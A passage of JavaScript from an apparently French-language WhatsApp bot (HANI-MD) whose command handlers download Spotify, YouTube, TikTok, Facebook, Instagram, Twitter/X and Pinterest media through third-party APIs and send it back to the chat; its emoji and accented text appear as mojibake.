        let trackArtist = "";
        let audioBuffer = null;
        let success = false;
        
        // â•â•â•â•â•â•â• API 1: Vreden Spotify â•â•â•â•â•â•â•
        if (!success) {
          try {
            const searchQuery = isSpotifyLink ? args : encodeURIComponent(args);
            const apiUrl = isSpotifyLink 
              ? `https://api.vrfrnd.xyz/api/spotify?url=${searchQuery}`
              : `https://api.vrfrnd.xyz/api/spotify?query=${searchQuery}`;
            
            const response = await fetch(apiUrl, { timeout: 15000 });
            const data = await response.json();
            
            if (data.status && data.data) {
              trackTitle = data.data.title || data.data.name || args;
              trackArtist = data.data.artist || data.data.artists || "";
              
              if (data.data.download || data.data.audio) {
                const audioUrl = data.data.download || data.data.audio;
                const audioResp = await fetch(audioUrl);
                audioBuffer = await audioResp.buffer();
                success = true;
                console.log("ðŸŽµ [SPOTIFY] API 1 (Vreden) - SuccÃ¨s");
              }
            }
          } catch (e) {
            console.log("ðŸŽµ [SPOTIFY] API 1 Ã©chouÃ©e:", e.message);
          }
        }
        
        // â•â•â•â•â•â•â• API 2: Agatz Spotify â•â•â•â•â•â•â•
        if (!success) {
          try {
            const apiUrl = isSpotifyLink 
              ? `https://api.agatz.xyz/api/spotifydl?url=${encodeURIComponent(args)}`
              : `https://api.agatz.xyz/api/spotifydl?query=${encodeURIComponent(args)}`;
            
            const response = await fetch(apiUrl, { timeout: 15000 });
            const data = await response.json();
            
            if (data.status === 200 && data.data) {
              trackTitle = data.data.title || args;
              trackArtist = data.data.artist || "";
              
              if (data.data.download || data.data.url) {
                const audioUrl = data.data.download || data.data.url;
                const audioResp = await fetch(audioUrl);
                audioBuffer = await audioResp.buffer();
                success = true;
                console.log("ðŸŽµ [SPOTIFY] API 2 (Agatz) - SuccÃ¨s");
              }
            }
          } catch (e) {
            console.log("ðŸŽµ [SPOTIFY] API 2 Ã©chouÃ©e:", e.message);
          }
        }
        
        // â•â•â•â•â•â•â• API 3: Neoxr Spotify â•â•â•â•â•â•â•
        if (!success) {
          try {
            const apiUrl = `https://api.neoxr.eu/api/spotify?url=${encodeURIComponent(args)}&apikey=free`;
            const response = await fetch(apiUrl, { timeout: 15000 });
            const data = await response.json();
            
            if (data.status && data.data) {
              trackTitle = data.data.title || args;
              trackArtist = data.data.artists || "";
              
              if (data.data.url) {
                const audioResp = await fetch(data.data.url);
                audioBuffer = await audioResp.buffer();
                success = true;
                console.log("ðŸŽµ [SPOTIFY] API 3 (Neoxr) - SuccÃ¨s");
              }
            }
          } catch (e) {
            console.log("ðŸŽµ [SPOTIFY] API 3 Ã©chouÃ©e:", e.message);
          }
        }
        
        // â•â•â•â•â•â•â• API 4: Nyxs Spotify â•â•â•â•â•â•â•
        if (!success) {
          try {
            const apiUrl = `https://api.nyxs.pw/dl/spotify?url=${encodeURIComponent(args)}`;
            const response = await fetch(apiUrl, { timeout: 15000 });
            const data = await response.json();
            
            if (data.result) {
              trackTitle = data.result.title || args;
              trackArtist = data.result.artist || "";
              
              if (data.result.url) {
                const audioResp = await fetch(data.result.url);
                audioBuffer = await audioResp.buffer();
                success = true;
                console.log("ðŸŽµ [SPOTIFY] API 4 (Nyxs) - SuccÃ¨s");
              }
            }
          } catch (e) {
            console.log("ðŸŽµ [SPOTIFY] API 4 Ã©chouÃ©e:", e.message);
          }
        }
        
        // â•â•â•â•â•â•â• FALLBACK: YouTube Search + Download â•â•â•â•â•â•â•
        if (!success && !isSpotifyLink) {
          try {
            await send("ðŸ”„ *Recherche via YouTube...*");
            
            // Recherche YouTube
            const ytSearchUrl = `https://api.agatz.xyz/api/ytsearch?query=${encodeURIComponent(args)}`;
            const searchResp = await fetch(ytSearchUrl, { timeout: 10000 });
            const searchData = await searchResp.json();
            
            if (searchData.status === 200 && searchData.data && searchData.data.length > 0) {
              const firstResult = searchData.data[0];
              trackTitle = firstResult.title || args;
              
              // TÃ©lÃ©charger depuis YouTube
              const ytDlUrl = `https://api.agatz.xyz/api/ytdl?url=${encodeURIComponent(firstResult.url)}&type=audio`;
              const dlResp = await fetch(ytDlUrl, { timeout: 30000 });
              const dlData = await dlResp.json();
              
              if (dlData.status === 200 && dlData.data && dlData.data.url) {
                const audioResp = await fetch(dlData.data.url);
                audioBuffer = await audioResp.buffer();
                success = true;
                console.log("ðŸŽµ [SPOTIFY] Fallback YouTube - SuccÃ¨s");
              }
            }
          } catch (e) {
            console.log("ðŸŽµ [SPOTIFY] Fallback YouTube Ã©chouÃ©:", e.message);
          }
        }
        
        // â•â•â•â•â•â•â• ENVOYER L'AUDIO â•â•â•â•â•â•â•
        if (success && audioBuffer) {
          // Envoyer les infos
          const infoMsg = `ðŸŽµ *${trackTitle}*${trackArtist ? `\nðŸ‘¤ ${trackArtist}` : ''}`;
          await send(infoMsg);
          
          // Envoyer l'audio
          await hani.sendMessage(from, {
            audio: audioBuffer,
            mimetype: "audio/mpeg",
            fileName: `${trackTitle.replace(/[^a-zA-Z0-9 ]/g, '')}.mp3`
          }, { quoted: msg });
          
          return;
        }
        
        // Si rien n'a fonctionnÃ©
        return send(`âŒ *Impossible de tÃ©lÃ©charger cette musique*\n\nðŸ’¡ *Essaie:*\nâ€¢ VÃ©rifie le titre/lien\nâ€¢ \`.play ${args}\` (via YouTube)\nâ€¢ \`.song ${args}\` (alternative)`);
        
      } catch (e) {
        console.log("ðŸŽµ [SPOTIFY] Erreur globale:", e.message);
        return send(`âŒ Erreur: ${e.message}\n\nðŸ’¡ Essaie \`.play ${args}\` en alternative`);
      }
    }

    case "spsearch":
    case "spotifysearch":
    case "searchspotify": {
      if (!args) {
        return send(`ðŸ” *RECHERCHE SPOTIFY*\n\nðŸ“‹ *Usage:*\n\`.spsearch [titre ou artiste]\`\n\nðŸ“ *Exemple:*\n\`.spsearch Burna Boy\`\n\`.spsearch Rema\``);
      }
      
      await send("ðŸ” *Recherche Spotify en cours...*");
      
      try {
        let results = "";
        let found = false;
        
        // API 1: Agatz
        try {
          const searchUrl = `https://api.agatz.xyz/api/spotifysearch?query=${encodeURIComponent(args)}`;
          const response = await fetch(searchUrl, { timeout: 10000 });
          const data = await response.json();
          
          if (data.status === 200 && data.data && data.data.length > 0) {
            results = `ðŸŽµ *RÃ©sultats Spotify: "${args}"*\n\n`;
            
            const tracks = data.data.slice(0, 6);
            for (let i = 0; i < tracks.length; i++) {
              const t = tracks[i];
              results += `${i + 1}. *${t.title || t.name || 'Sans titre'}*\n`;
              results += `   ðŸ‘¤ ${t.artist || t.artists || 'Inconnu'}\n`;
              if (t.duration) results += `   â±ï¸ ${t.duration}\n`;
              results += `\n`;
            }
            
            results += `ðŸ’¡ *Pour tÃ©lÃ©charger:*\n\`.spotify [titre exact]\``;
            found = true;
          }
        } catch (e) {
          console.log("Recherche API 1 Ã©chouÃ©e:", e.message);
        }
        
        // Fallback: YouTube Search
        if (!found) {
          try {
            const ytSearchUrl = `https://api.agatz.xyz/api/ytsearch?query=${encodeURIComponent(args + " official audio")}`;
            const response = await fetch(ytSearchUrl, { timeout: 10000 });
            const data = await response.json();
            
            if (data.status === 200 && data.data && data.data.length > 0) {
              results = `ðŸŽµ *RÃ©sultats pour "${args}"*\n_(via YouTube)_\n\n`;
              
              const tracks = data.data.slice(0, 5);
              for (let i = 0; i < tracks.length; i++) {
                const t = tracks[i];
                results += `${i + 1}. *${t.title}*\n`;
                if (t.duration) results += `   â±ï¸ ${t.duration}\n`;
                results += `\n`;
              }
              
              results += `ðŸ’¡ *Pour tÃ©lÃ©charger:*\n\`.spotify [titre]\` ou \`.play [titre]\``;
              found = true;
            }
          } catch (e) {
            console.log("Recherche YouTube Ã©chouÃ©e:", e.message);
          }
        }
        
        if (found) {
          return send(results);
        }
        
        return send(`âŒ Aucun rÃ©sultat pour "${args}"\n\nðŸ’¡ Essaie avec d'autres mots-clÃ©s`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    case "song":
    case "music":
    case "chanson": {
      // Alias pour play (tÃ©lÃ©charge l'audio depuis YouTube)
      if (!args) {
        return send(`ðŸŽµ *MUSIQUE*\n\nðŸ“‹ *Usage:*\n\`.song [titre]\`\n\nðŸ“ *Exemple:*\n\`.song Rema Calm Down\``);
      }
      
      // ExÃ©cuter la mÃªme logique que play
      await send("ðŸŽµ *Recherche de la musique...*\nâ³ _Patiente quelques secondes..._");
      
      try {
        let audioBuffer = null;
        let trackInfo = { title: args, artist: "", thumbnail: "" };
        
        // API 1: itzpire YouTube Audio
        try {
          const apiUrl = `https://itzpire.com/download/yt-music?url=${encodeURIComponent(args)}`;
          const resp = await fetch(apiUrl, { timeout: 20000 });
          const data = await resp.json();
          
          if (data.status === "success" && data.data) {
            trackInfo.title = data.data.title || args;
            trackInfo.thumbnail = data.data.thumbnail || "";
            if (data.data.download) {
              const audioResp = await fetch(data.data.download);
              audioBuffer = await audioResp.buffer();
            }
          }
        } catch (e) {
          console.log("[SONG] API 1 Ã©chouÃ©e:", e.message);
        }
        
        // API 2: Alternative avec ytdl
        if (!audioBuffer) {
          try {
            const searchUrl = `https://api.vrfrnd.xyz/api/ytsearch?query=${encodeURIComponent(args)}`;
            const searchResp = await fetch(searchUrl, { timeout: 10000 });
            const searchData = await searchResp.json();
            
            if (searchData.status && searchData.data && searchData.data[0]) {
              const videoUrl = searchData.data[0].url;
              trackInfo.title = searchData.data[0].title || args;
              trackInfo.thumbnail = searchData.data[0].thumbnail || "";
              
              const dlUrl = `https://api.vrfrnd.xyz/api/ytmp3?url=${encodeURIComponent(videoUrl)}`;
              const dlResp = await fetch(dlUrl, { timeout: 20000 });
              const dlData = await dlResp.json();
              
              if (dlData.status && dlData.data && dlData.data.download) {
                const audioResp = await fetch(dlData.data.download);
                audioBuffer = await audioResp.buffer();
              }
            }
          } catch (e) {
            console.log("[SONG] API 2 Ã©chouÃ©e:", e.message);
          }
        }
        
        if (audioBuffer) {
          await hani.sendMessage(from, {
            audio: audioBuffer,
            mimetype: "audio/mp4",
            ptt: false,
            fileName: `${trackInfo.title}.mp3`
          }, { quoted: msg });
          
          return send(`ðŸŽµ *${trackInfo.title}*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”Š *Powered by HANI-MD*`);
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger "${args}"\n\nðŸ’¡ Essaie avec un autre titre`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // ðŸ“¥ TÃ‰LÃ‰CHARGEMENT YOUTUBE - Audio & VidÃ©o
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    case "play":
    case "ytmp3": {
      if (!args) {
        return send(`ðŸŽµ *TÃ‰LÃ‰CHARGER AUDIO YOUTUBE*\n\nðŸ“‹ *Usage:*\n\`.play [titre ou lien YouTube]\`\n\nðŸ“ *Exemples:*\n\`.play Rema Calm Down\`\n\`.play https://youtube.com/watch?v=...\`\n\nðŸ”Š TÃ©lÃ©charge l'audio en MP3!`);
      }
      
      await send("ðŸŽµ *TÃ©lÃ©chargement audio en cours...*\nâ³ _Patiente quelques secondes..._");
      
      try {
        const isYouTubeLink = args.includes("youtube.com") || args.includes("youtu.be");
        let audioBuffer = null;
        let trackInfo = { title: args, thumbnail: "" };
        
        // Si c'est un lien YouTube direct
        if (isYouTubeLink) {
          // API 1: Vreden
          try {
            const apiUrl = `https://api.vrfrnd.xyz/api/ytmp3?url=${encodeURIComponent(args)}`;
            const resp = await fetch(apiUrl, { timeout: 25000 });
            const data = await resp.json();
            
            if (data.status && data.data) {
              trackInfo.title = data.data.title || args;
              trackInfo.thumbnail = data.data.thumbnail || "";
              if (data.data.download) {
                const audioResp = await fetch(data.data.download);
                audioBuffer = await audioResp.buffer();
              }
            }
          } catch (e) {
            console.log("[PLAY] API Vreden Ã©chouÃ©e:", e.message);
          }
          
          // API 2: Agatz
          if (!audioBuffer) {
            try {
              const apiUrl = `https://api.agatz.xyz/api/ytmp3?url=${encodeURIComponent(args)}`;
              const resp = await fetch(apiUrl, { timeout: 25000 });
              const data = await resp.json();
              
              if (data.status === 200 && data.data) {
                trackInfo.title = data.data.title || args;
                if (data.data.download) {
                  const audioResp = await fetch(data.data.download);
                  audioBuffer = await audioResp.buffer();
                }
              }
            } catch (e) {
              console.log("[PLAY] API Agatz Ã©chouÃ©e:", e.message);
            }
          }
        } else {
          // Recherche par titre
          try {
            // Recherche
            const searchUrl = `https://api.vrfrnd.xyz/api/ytsearch?query=${encodeURIComponent(args)}`;
            const searchResp = await fetch(searchUrl, { timeout: 10000 });
            const searchData = await searchResp.json();
            
            if (searchData.status && searchData.data && searchData.data[0]) {
              const video = searchData.data[0];
              trackInfo.title = video.title || args;
              trackInfo.thumbnail = video.thumbnail || "";
              
              // TÃ©lÃ©charger l'audio
              const dlUrl = `https://api.vrfrnd.xyz/api/ytmp3?url=${encodeURIComponent(video.url)}`;
              const dlResp = await fetch(dlUrl, { timeout: 25000 });
              const dlData = await dlResp.json();
              
              if (dlData.status && dlData.data && dlData.data.download) {
                const audioResp = await fetch(dlData.data.download);
                audioBuffer = await audioResp.buffer();
              }
            }
          } catch (e) {
            console.log("[PLAY] Recherche Ã©chouÃ©e:", e.message);
          }
          
          // API alternative pour recherche
          if (!audioBuffer) {
            try {
              const apiUrl = `https://itzpire.com/download/yt-music?url=${encodeURIComponent(args)}`;
              const resp = await fetch(apiUrl, { timeout: 20000 });
              const data = await resp.json();
              
              if (data.status === "success" && data.data) {
                trackInfo.title = data.data.title || args;
                if (data.data.download) {
                  const audioResp = await fetch(data.data.download);
                  audioBuffer = await audioResp.buffer();
                }
              }
            } catch (e) {
              console.log("[PLAY] API itzpire Ã©chouÃ©e:", e.message);
            }
          }
        }
        
        if (audioBuffer) {
          // Envoyer avec thumbnail si disponible
          if (trackInfo.thumbnail) {
            try {
              await hani.sendMessage(from, {
                image: { url: trackInfo.thumbnail },
                caption: `ðŸŽµ *${trackInfo.title}*\n\nâ³ Envoi de l'audio...`
              }, { quoted: msg });
            } catch (e) {}
          }
          
          await hani.sendMessage(from, {
            audio: audioBuffer,
            mimetype: "audio/mp4",
            ptt: false,
            fileName: `${trackInfo.title}.mp3`
          }, { quoted: msg });
          
          return send(`âœ… *TÃ©lÃ©chargement terminÃ©!*\nðŸ”Š *Powered by HANI-MD*`);
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger "${args}"\n\nðŸ’¡ VÃ©rifie le lien ou le titre`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    case "video":
    case "ytmp4": {
      if (!args) {
        return send(`ðŸŽ¬ *TÃ‰LÃ‰CHARGER VIDÃ‰O YOUTUBE*\n\nðŸ“‹ *Usage:*\n\`.video [titre ou lien YouTube]\`\n\nðŸ“ *Exemples:*\n\`.video Rema Calm Down\`\n\`.video https://youtube.com/watch?v=...\`\n\nðŸ“¹ TÃ©lÃ©charge la vidÃ©o en MP4!`);
      }
      
      await send("ðŸŽ¬ *TÃ©lÃ©chargement vidÃ©o en cours...*\nâ³ _Patiente quelques secondes..._");
      
      try {
        const isYouTubeLink = args.includes("youtube.com") || args.includes("youtu.be");
        let videoBuffer = null;
        let trackInfo = { title: args, thumbnail: "" };
        
        // Si c'est un lien YouTube direct
        if (isYouTubeLink) {
          // API 1: Vreden
          try {
            const apiUrl = `https://api.vrfrnd.xyz/api/ytmp4?url=${encodeURIComponent(args)}`;
            const resp = await fetch(apiUrl, { timeout: 30000 });
            const data = await resp.json();
            
            if (data.status && data.data) {
              trackInfo.title = data.data.title || args;
              if (data.data.download) {
                const videoResp = await fetch(data.data.download);
                videoBuffer = await videoResp.buffer();
              }
            }
          } catch (e) {
            console.log("[VIDEO] API 1 Ã©chouÃ©e:", e.message);
          }
          
          // API 2: Agatz
          if (!videoBuffer) {
            try {
              const apiUrl = `https://api.agatz.xyz/api/ytmp4?url=${encodeURIComponent(args)}`;
              const resp = await fetch(apiUrl, { timeout: 30000 });
              const data = await resp.json();
              
              if (data.status === 200 && data.data) {
                trackInfo.title = data.data.title || args;
                if (data.data.download) {
                  const videoResp = await fetch(data.data.download);
                  videoBuffer = await videoResp.buffer();
                }
              }
            } catch (e) {
              console.log("[VIDEO] API 2 Ã©chouÃ©e:", e.message);
            }
          }
        } else {
          // Recherche par titre
          try {
            const searchUrl = `https://api.vrfrnd.xyz/api/ytsearch?query=${encodeURIComponent(args)}`;
            const searchResp = await fetch(searchUrl, { timeout: 10000 });
            const searchData = await searchResp.json();
            
            if (searchData.status && searchData.data && searchData.data[0]) {
              const video = searchData.data[0];
              trackInfo.title = video.title || args;
              
              const dlUrl = `https://api.vrfrnd.xyz/api/ytmp4?url=${encodeURIComponent(video.url)}`;
              const dlResp = await fetch(dlUrl, { timeout: 30000 });
              const dlData = await dlResp.json();
              
              if (dlData.status && dlData.data && dlData.data.download) {
                const videoResp = await fetch(dlData.data.download);
                videoBuffer = await videoResp.buffer();
              }
            }
          } catch (e) {
            console.log("[VIDEO] Recherche Ã©chouÃ©e:", e.message);
          }
        }
        
        if (videoBuffer) {
          await hani.sendMessage(from, {
            video: videoBuffer,
            mimetype: "video/mp4",
            caption: `ðŸŽ¬ *${trackInfo.title}*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ“¹ *Powered by HANI-MD*`,
            fileName: `${trackInfo.title}.mp4`
          }, { quoted: msg });
          
          return;
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger "${args}"\n\nðŸ’¡ VÃ©rifie le lien ou le titre`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // ðŸ“¥ TÃ‰LÃ‰CHARGEMENT RÃ‰SEAUX SOCIAUX
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    case "tiktok":
    case "tt":
    case "tiktokdl": {
      if (!args) {
        return send(`ðŸ“± *TÃ‰LÃ‰CHARGER TIKTOK*\n\nðŸ“‹ *Usage:*\n\`.tiktok [lien TikTok]\`\n\nðŸ“ *Exemple:*\n\`.tiktok https://vm.tiktok.com/...\`\n\nðŸŽ¬ TÃ©lÃ©charge la vidÃ©o sans watermark!`);
      }
      
      if (!args.includes("tiktok.com")) {
        return send(`âŒ Lien TikTok invalide!\n\nðŸ’¡ Exemple:\n\`.tiktok https://vm.tiktok.com/ABC123\``);
      }
      
      await send("ðŸ“± *TÃ©lÃ©chargement TikTok en cours...*\nâ³ _Sans watermark..._");
      
      try {
        let videoBuffer = null;
        let videoInfo = { title: "", author: "" };
        
        // API 1: itzpire
        try {
          const apiUrl = `https://itzpire.com/download/tiktok?url=${encodeURIComponent(args)}`;
          const resp = await fetch(apiUrl, { timeout: 20000 });
          const data = await resp.json();
          
          if (data.status === "success" && data.data) {
            videoInfo.title = data.data.title || "";
            videoInfo.author = data.data.author || "";
            const videoUrl = data.data.video || data.data.nowm;
            if (videoUrl) {
              const videoResp = await fetch(videoUrl);
              videoBuffer = await videoResp.buffer();
            }
          }
        } catch (e) {
          console.log("[TIKTOK] API 1 Ã©chouÃ©e:", e.message);
        }
        
        // API 2: Agatz
        if (!videoBuffer) {
          try {
            const apiUrl = `https://api.agatz.xyz/api/tiktok?url=${encodeURIComponent(args)}`;
            const resp = await fetch(apiUrl, { timeout: 20000 });
            const data = await resp.json();
            
            if (data.status === 200 && data.data) {
              videoInfo.author = data.data.author || "";
              const videoUrl = data.data.nowm || data.data.video;
              if (videoUrl) {
                const videoResp = await fetch(videoUrl);
                videoBuffer = await videoResp.buffer();
              }
            }
          } catch (e) {
            console.log("[TIKTOK] API 2 Ã©chouÃ©e:", e.message);
          }
        }
        
        // API 3: Vreden
        if (!videoBuffer) {
          try {
            const apiUrl = `https://api.vrfrnd.xyz/api/tiktok?url=${encodeURIComponent(args)}`;
            const resp = await fetch(apiUrl, { timeout: 20000 });
            const data = await resp.json();
            
            if (data.status && data.data) {
              const videoUrl = data.data.nowm || data.data.video;
              if (videoUrl) {
                const videoResp = await fetch(videoUrl);
                videoBuffer = await videoResp.buffer();
              }
            }
          } catch (e) {
            console.log("[TIKTOK] API 3 Ã©chouÃ©e:", e.message);
          }
        }
        
        if (videoBuffer) {
          await hani.sendMessage(from, {
            video: videoBuffer,
            mimetype: "video/mp4",
            caption: `ðŸ“± *TikTok*\n${videoInfo.author ? `ðŸ‘¤ @${videoInfo.author}` : ""}\n\nâœ… Sans watermark!\nðŸ”¥ *Powered by HANI-MD*`
          }, { quoted: msg });
          
          return;
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger cette vidÃ©o TikTok\n\nðŸ’¡ VÃ©rifie que le lien est valide`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    case "facebook":
    case "fb":
    case "fbdl": {
      if (!args) {
        return send(`ðŸ“˜ *TÃ‰LÃ‰CHARGER FACEBOOK*\n\nðŸ“‹ *Usage:*\n\`.fb [lien vidÃ©o Facebook]\`\n\nðŸ“ *Exemple:*\n\`.fb https://www.facebook.com/watch?v=...\`\n\nðŸŽ¬ TÃ©lÃ©charge la vidÃ©o!`);
      }
      
      if (!args.includes("facebook.com") && !args.includes("fb.watch")) {
        return send(`âŒ Lien Facebook invalide!\n\nðŸ’¡ Exemple:\n\`.fb https://www.facebook.com/watch?v=123\``);
      }
      
      await send("ðŸ“˜ *TÃ©lÃ©chargement Facebook en cours...*");
      
      try {
        let videoBuffer = null;
        
        // API 1: itzpire
        try {
          const apiUrl = `https://itzpire.com/download/facebook?url=${encodeURIComponent(args)}`;
          const resp = await fetch(apiUrl, { timeout: 20000 });
          const data = await resp.json();
          
          if (data.status === "success" && data.data) {
            const videoUrl = data.data.hd || data.data.sd || data.data.video;
            if (videoUrl) {
              const videoResp = await fetch(videoUrl);
              videoBuffer = await videoResp.buffer();
            }
          }
        } catch (e) {
          console.log("[FB] API 1 Ã©chouÃ©e:", e.message);
        }
        
        // API 2: Agatz
        if (!videoBuffer) {
          try {
            const apiUrl = `https://api.agatz.xyz/api/facebook?url=${encodeURIComponent(args)}`;
            const resp = await fetch(apiUrl, { timeout: 20000 });
            const data = await resp.json();
            
            if (data.status === 200 && data.data) {
              const videoUrl = data.data.hd || data.data.sd;
              if (videoUrl) {
                const videoResp = await fetch(videoUrl);
                videoBuffer = await videoResp.buffer();
              }
            }
          } catch (e) {
            console.log("[FB] API 2 Ã©chouÃ©e:", e.message);
          }
        }
        
        if (videoBuffer) {
          await hani.sendMessage(from, {
            video: videoBuffer,
            mimetype: "video/mp4",
            caption: `ðŸ“˜ *VidÃ©o Facebook*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
          }, { quoted: msg });
          
          return;
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger cette vidÃ©o Facebook\n\nðŸ’¡ VÃ©rifie que le lien est public`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    case "instagram":
    case "ig":
    case "igdl": {
      if (!args) {
        return send(`ðŸ“¸ *TÃ‰LÃ‰CHARGER INSTAGRAM*\n\nðŸ“‹ *Usage:*\n\`.ig [lien post/reel Instagram]\`\n\nðŸ“ *Exemple:*\n\`.ig https://www.instagram.com/reel/...\`\n\nðŸŽ¬ TÃ©lÃ©charge photos et vidÃ©os!`);
      }
      
      if (!args.includes("instagram.com")) {
        return send(`âŒ Lien Instagram invalide!\n\nðŸ’¡ Exemple:\n\`.ig https://www.instagram.com/reel/ABC123\``);
      }
      
      await send("ðŸ“¸ *TÃ©lÃ©chargement Instagram en cours...*");
      
      try {
        let mediaUrl = null;
        let isVideo = false;
        
        // API 1: itzpire
        try {
          const apiUrl = `https://itzpire.com/download/instagram?url=${encodeURIComponent(args)}`;
          const resp = await fetch(apiUrl, { timeout: 20000 });
          const data = await resp.json();
          
          if (data.status === "success" && data.data) {
            if (Array.isArray(data.data) && data.data[0]) {
              mediaUrl = data.data[0].url;
              isVideo = data.data[0].type === "video";
            } else if (data.data.url) {
              mediaUrl = data.data.url;
              isVideo = data.data.type === "video";
            }
          }
        } catch (e) {
          console.log("[IG] API 1 Ã©chouÃ©e:", e.message);
        }
        
        // API 2: Agatz
        if (!mediaUrl) {
          try {
            const apiUrl = `https://api.agatz.xyz/api/instagram?url=${encodeURIComponent(args)}`;
            const resp = await fetch(apiUrl, { timeout: 20000 });
            const data = await resp.json();
            
            if (data.status === 200 && data.data) {
              if (Array.isArray(data.data) && data.data[0]) {
                mediaUrl = data.data[0].url;
                isVideo = data.data[0].type === "video";
              } else {
                mediaUrl = data.data.url || data.data.video || data.data.image;
                isVideo = !!data.data.video;
              }
            }
          } catch (e) {
            console.log("[IG] API 2 Ã©chouÃ©e:", e.message);
          }
        }
        
        if (mediaUrl) {
          const mediaResp = await fetch(mediaUrl);
          const mediaBuffer = await mediaResp.buffer();
          
          if (isVideo) {
            await hani.sendMessage(from, {
              video: mediaBuffer,
              mimetype: "video/mp4",
              caption: `ðŸ“¸ *Instagram*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
            }, { quoted: msg });
          } else {
            await hani.sendMessage(from, {
              image: mediaBuffer,
              caption: `ðŸ“¸ *Instagram*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
            }, { quoted: msg });
          }
          
          return;
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger ce contenu Instagram\n\nðŸ’¡ VÃ©rifie que le compte est public`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    case "twitter":
    case "x":
    case "twdl": {
      if (!args) {
        return send(`ðŸ¦ *TÃ‰LÃ‰CHARGER TWITTER/X*\n\nðŸ“‹ *Usage:*\n\`.twitter [lien tweet]\`\n\nðŸ“ *Exemple:*\n\`.twitter https://x.com/user/status/...\`\n\nðŸŽ¬ TÃ©lÃ©charge les mÃ©dias!`);
      }
      
      if (!args.includes("twitter.com") && !args.includes("x.com")) {
        return send(`âŒ Lien Twitter/X invalide!\n\nðŸ’¡ Exemple:\n\`.twitter https://x.com/user/status/123\``);
      }
      
      await send("ðŸ¦ *TÃ©lÃ©chargement Twitter/X en cours...*");
      
      try {
        let mediaUrl = null;
        let isVideo = false;
        
        // API: Agatz
        try {
          const apiUrl = `https://api.agatz.xyz/api/twitter?url=${encodeURIComponent(args)}`;
          const resp = await fetch(apiUrl, { timeout: 20000 });
          const data = await resp.json();
          
          if (data.status === 200 && data.data) {
            if (data.data.video) {
              mediaUrl = data.data.video;
              isVideo = true;
            } else if (data.data.image) {
              mediaUrl = data.data.image;
              isVideo = false;
            }
          }
        } catch (e) {
          console.log("[TWITTER] API Ã©chouÃ©e:", e.message);
        }
        
        if (mediaUrl) {
          const mediaResp = await fetch(mediaUrl);
          const mediaBuffer = await mediaResp.buffer();
          
          if (isVideo) {
            await hani.sendMessage(from, {
              video: mediaBuffer,
              mimetype: "video/mp4",
              caption: `ðŸ¦ *Twitter/X*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
            }, { quoted: msg });
          } else {
            await hani.sendMessage(from, {
              image: mediaBuffer,
              caption: `ðŸ¦ *Twitter/X*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
            }, { quoted: msg });
          }
          
          return;
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger ce contenu Twitter/X\n\nðŸ’¡ VÃ©rifie le lien`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    case "pinterest":
    case "pin": {
      if (!args) {
        return send(`ðŸ“Œ *TÃ‰LÃ‰CHARGER PINTEREST*\n\nðŸ“‹ *Usage:*\n\`.pin [lien Pinterest]\`\n\nðŸ“ *Exemple:*\n\`.pin https://pin.it/...\`\n\nðŸ–¼ï¸ TÃ©lÃ©charge l'image en HD!`);
      }
      
      if (!args.includes("pinterest") && !args.includes("pin.it")) {
        return send(`âŒ Lien Pinterest invalide!`);
      }
      
      await send("ðŸ“Œ *TÃ©lÃ©chargement Pinterest en cours...*");
      
      try {
        let imageUrl = null;
        
        try {
          const apiUrl = `https://api.agatz.xyz/api/pinterest?url=${encodeURIComponent(args)}`;
          const resp = await fetch(apiUrl, { timeout: 15000 });
          const data = await resp.json();
          
          if (data.status === 200 && data.data) {
            imageUrl = data.data.image || data.data.url;
          }
        } catch (e) {
          console.log("[PIN] API Ã©chouÃ©e:", e.message);
        }
        
        if (imageUrl) {
          const imgResp = await fetch(imageUrl);
          const imgBuffer = await imgResp.buffer();
          
          await hani.sendMessage(from, {
            image: imgBuffer,
            caption: `ðŸ“Œ *Pinterest*\n\nâœ… Image HD tÃ©lÃ©chargÃ©e!\nðŸ”¥ *Powered by HANI-MD*`
          }, { quoted: msg });
          
          return;
        }
        
        return send(`âŒ Impossible de tÃ©lÃ©charger cette image`);
        
      } catch (e) {
        return send(`âŒ Erreur: ${e.message}`);
      }
    }
